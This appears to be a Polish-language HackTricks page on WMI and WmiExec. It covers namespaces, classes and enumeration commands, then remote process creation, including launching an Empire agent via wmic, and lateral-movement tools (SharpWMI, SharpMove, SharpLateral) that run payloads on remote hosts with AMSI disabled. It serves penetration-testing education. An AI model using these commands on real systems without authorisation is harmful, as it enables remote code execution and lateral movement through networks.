# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Wyjaśnienie działania

Procesy mogą być uruchamiane na hostach, na których znana jest nazwa użytkownika oraz hasło lub hash, za pomocą WMI. Polecenia są wykonywane przy użyciu WMI przez Wmiexec, zapewniając doświadczenie półinteraktywnej powłoki.

**dcomexec.py:** Za pomocą różnych endpointów DCOM ten skrypt oferuje półinteraktywną powłokę podobną do `wmiexec.py`. Wybrana wartość `-object` określa endpoint; obsługiwane obiekty obejmują `MMC20.Application`, `ShellWindows` oraz `ShellBrowserWindow`, przy czym ten ostatni zapewnia technikę Shell Browser Window wyróżnioną w oryginalnym przewodniku.<sup>[[2]](#references)[[3]](#references)</sup>

## Podstawy WMI

### Namespace

Zorganizowany w hierarchię przypominającą strukturę katalogów, najwyższym kontenerem WMI jest \root, pod którym uporządkowane są dodatkowe katalogi nazywane namespaces.<sup>[[1]](#references)</sup>
Polecenia do wyświetlenia namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasy w obrębie przestrzeni nazw można wyświetlić za pomocą:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasy**

Znajomość nazwy klasy WMI, takiej jak win32_process, oraz przestrzeni nazw, w której się znajduje, ma kluczowe znaczenie dla każdej operacji WMI.  
Polecenia umożliwiające wyświetlenie klas zaczynających się od `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Wywołanie klasy:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metody

Metody, które są jedną lub większą liczbą wykonywalnych funkcji klas WMI, mogą być wykonywane.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumeracja WMI

### Stan usługi WMI

Polecenia służące do sprawdzenia, czy usługa WMI działa:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informacje o systemie i procesach

Zbieranie informacji o systemie i procesach za pośrednictwem WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Dla attackerów WMI jest potężnym narzędziem do enumeracji wrażliwych danych dotyczących systemów lub domen.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Zdalne wykonywanie zapytań WMI w celu uzyskania określonych informacji, takich jak lokalni administratorzy lub zalogowani użytkownicy, jest możliwe przy starannym konstruowaniu poleceń.

### **Ręczne zdalne wykonywanie zapytań WMI**

Dyskretne identyfikowanie lokalnych administratorów na zdalnym komputerze oraz zalogowanych użytkowników można przeprowadzić za pomocą określonych zapytań WMI. `wmic` obsługuje również odczyt z pliku tekstowego w celu jednoczesnego wykonywania poleceń na wielu węzłach.<sup>[[1]](#references)</sup>

Aby zdalnie uruchomić proces za pośrednictwem WMI, na przykład wdrożyć agenta Empire, stosuje się następującą strukturę polecenia. Pomyślne wykonanie jest sygnalizowane wartością zwracaną „0”:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Ten proces ilustruje możliwości WMI w zakresie zdalnego wykonywania poleceń i inwentaryzacji systemu, podkreślając jego przydatność zarówno dla administracji systemami, jak i pentestingu.

## Narzędzia automatyczne

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Możesz również użyć **Impacket's `wmiexec`**.


## References

- [1] [Używanie danych uwierzytelniających do przejmowania komputerów z systemem Windows — część 3 (WMI i WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket — dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Przewodnik dla początkujących po zestawie narzędzi Impacket, część 1 — Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
